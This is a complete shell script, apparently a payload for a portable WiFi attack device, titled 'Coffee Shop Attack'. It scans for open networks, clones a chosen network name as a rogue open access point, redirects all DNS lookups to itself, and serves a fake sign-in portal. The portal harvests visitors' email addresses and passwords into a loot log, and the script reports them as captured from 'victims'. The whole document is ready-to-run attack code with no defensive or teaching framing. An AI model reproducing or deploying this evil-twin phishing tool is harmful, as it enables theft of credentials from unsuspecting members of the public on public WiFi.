#!/bin/sh
# Title: Coffee Shop Attack
# Author: bad-antics
# Description: Automated attack for public WiFi environments
# Uses: iw, hostapd, dnsmasq, uhttpd (no aircrack needed)

LOOT_DIR="/mmc/nullsec/public"
mkdir -p "$LOOT_DIR"
CRED_LOG="$LOOT_DIR/cafe_$(date +%Y%m%d_%H%M).txt"
PORTAL_DIR="/tmp/cafe_portal"

echo "☕ COFFEE SHOP ATTACK"
echo "━━━━━━━━━━━━━━━━━━━━━"

# Check interfaces
[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }

# Scan for open networks using iw
echo "[*] Scanning for open networks..."
iw dev wlan0 scan 2>/dev/null | grep -E "SSID:|signal:|BSS|WPA|RSN" > /tmp/wifi_scan.txt

# Parse open networks (no WPA/RSN = open)
echo "[*] Finding open networks..."
current_bss=""
current_ssid=""
current_signal=""
> /tmp/open_networks.txt

while read line; do
    case "$line" in
        BSS*)
            if [ -n "$current_bss" ] && [ -n "$current_ssid" ] && [ "$is_open" = "1" ]; then
                echo "$current_bss|$current_ssid|$current_signal" >> /tmp/open_networks.txt
            fi
            current_bss=$(echo "$line" | grep -oE '[0-9a-f:]{17}')
            is_open="1"
            current_signal=""
            current_ssid=""
            ;;
        *signal:*)
            current_signal=$(echo "$line" | grep -oE '\-[0-9]+')
            ;;
        *SSID:*)
            current_ssid=$(echo "$line" | sed 's/.*SSID: //')
            ;;
        *WPA*|*RSN*)
            is_open="0"
            ;;
    esac
done < /tmp/wifi_scan.txt

# Last entry
if [ -n "$current_bss" ] && [ -n "$current_ssid" ] && [ "$is_open" = "1" ]; then
    echo "$current_bss|$current_ssid|$current_signal" >> /tmp/open_networks.txt
fi

OPEN_COUNT=$(wc -l < /tmp/open_networks.txt 2>/dev/null | tr -d ' ')
echo "[+] Found $OPEN_COUNT open networks"

if [ "$OPEN_COUNT" = "0" ]; then
    echo "[!] No open networks found. Using default SSID."
    TARGET_SSID="Free_Coffee_WiFi"
else
    echo ""
    echo "Available networks:"
    cat -n /tmp/open_networks.txt | while read num line; do
        ssid=$(echo "$line" | cut -d'|' -f2)
        sig=$(echo "$line" | cut -d'|' -f3)
        echo "  $num) $ssid (${sig}dBm)"
    done
    
    echo ""
    echo -n "Select target (1-$OPEN_COUNT) or enter custom SSID: "
    read TARGET_NUM
    
    if [ "$TARGET_NUM" -gt 0 ] 2>/dev/null; then
        TARGET_LINE=$(sed -n "${TARGET_NUM}p" /tmp/open_networks.txt)
        TARGET_SSID=$(echo "$TARGET_LINE" | cut -d'|' -f2)
    else
        TARGET_SSID="$TARGET_NUM"
    fi
fi

echo ""
echo -n "Duration in minutes [30]: "
read DURATION
DURATION=${DURATION:-30}
DURATION_SEC=$((DURATION * 60))

echo ""
echo "[*] Target: $TARGET_SSID"
echo "[*] Duration: ${DURATION} minutes"
echo ""
echo -n "Press ENTER to start attack..."
read dummy

# Kill existing services
killall hostapd dnsmasq uhttpd 2>/dev/null
sleep 1

# Create portal directory
mkdir -p "$PORTAL_DIR"

# Create capture CGI script (works without PHP)
mkdir -p "$PORTAL_DIR/cgi-bin"
cat > "$PORTAL_DIR/cgi-bin/capture" << CAPEOF
#!/bin/sh
echo "Content-type: text/html"
echo ""

# Read POST data
read POST_DATA

# Log credentials
TS=\$(date "+%Y-%m-%d %H:%M:%S")
IP=\$REMOTE_ADDR
echo "[\$TS] IP:\$IP DATA:\$POST_DATA" >> $CRED_LOG

# Redirect to success
cat << HTMLEOF
<!DOCTYPE html>
<html><head><meta http-equiv="refresh" content="2;url=/success.html"></head>
<body><h1>Connecting...</h1></body></html>
HTMLEOF
CAPEOF
chmod +x "$PORTAL_DIR/cgi-bin/capture"

# Create portal HTML
cat > "$PORTAL_DIR/index.html" << PORTALEOF
<!DOCTYPE html>
<html>
<head>
<title>$TARGET_SSID - Free WiFi</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;background:#f9f9f9;margin:0;padding:20px;}
.container{max-width:400px;margin:0 auto;background:white;padding:30px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);}
.logo{text-align:center;font-size:40px;margin-bottom:20px;}
h1{text-align:center;color:#333;font-size:22px;}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:16px;}
button{width:100%;padding:14px;background:#4caf50;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;}
.terms{background:#f5f5f5;padding:15px;border-radius:8px;font-size:12px;margin:20px 0;}
</style>
</head>
<body>
<div class="container">
<div class="logo">☕</div>
<h1>Welcome to $TARGET_SSID</h1>
<p style="text-align:center;color:#666;">Sign in to access free WiFi</p>
<form method="POST" action="/cgi-bin/capture">
<input type="email" name="email" placeholder="Email Address" required>
<input type="password" name="password" placeholder="Password (for account creation)">
<button type="submit">Connect to WiFi</button>
</form>
<div class="terms">
By connecting, you agree to our terms of service.
</div>
</div>
</body>
</html>
PORTALEOF

cat > "$PORTAL_DIR/success.html" << 'SUCCESSEOF'
<!DOCTYPE html>
<html><head><title>Connected!</title>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#f9f9f9;}
h1{color:#4caf50;}.icon{font-size:60px;}</style>
</head><body>
<div class="icon">✓</div>
<h1>You're Connected!</h1>
<p>Enjoy free WiFi</p>
</body></html>
SUCCESSEOF

# Start AP
echo "[*] Starting access point: $TARGET_SSID"
cat > /tmp/cafe_hostapd.conf << HOSTEOF
interface=wlan0
ssid=$TARGET_SSID
channel=6
hw_mode=g
auth_algs=1
wpa=0
HOSTEOF

hostapd /tmp/cafe_hostapd.conf -B
sleep 2

# Configure interface
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up

# Start DHCP/DNS
echo "[*] Starting DHCP/DNS..."
cat > /tmp/cafe_dns.conf << DNSEOF
interface=wlan0
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.200,12h
address=/#/10.0.0.1
DNSEOF
dnsmasq -C /tmp/cafe_dns.conf

# Start web server with CGI support
echo "[*] Starting captive portal..."
uhttpd -p 10.0.0.1:80 -h "$PORTAL_DIR" -c /cgi-bin -i .cgi=/bin/sh 2>/dev/null &

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "☕ COFFEE SHOP ATTACK ACTIVE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "SSID: $TARGET_SSID"
echo "Portal: http://10.0.0.1/"
echo "Credentials: $CRED_LOG"
echo "Duration: ${DURATION} minutes"
echo ""
echo "Waiting for victims..."
echo "Press Ctrl+C to stop early"
echo ""

# Monitor for credentials
tail -f "$CRED_LOG" 2>/dev/null &
TAIL_PID=$!

# Wait for duration
sleep $DURATION_SEC

# Cleanup
kill $TAIL_PID 2>/dev/null
killall hostapd dnsmasq uhttpd 2>/dev/null

CRED_COUNT=$(wc -l < "$CRED_LOG" 2>/dev/null || echo 0)

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "☕ ATTACK COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Captured: $CRED_COUNT credentials"
echo "Log: $CRED_LOG"

if [ "$CRED_COUNT" -gt 0 ]; then
    echo ""
    echo "Captured credentials:"
    cat "$CRED_LOG"
fi
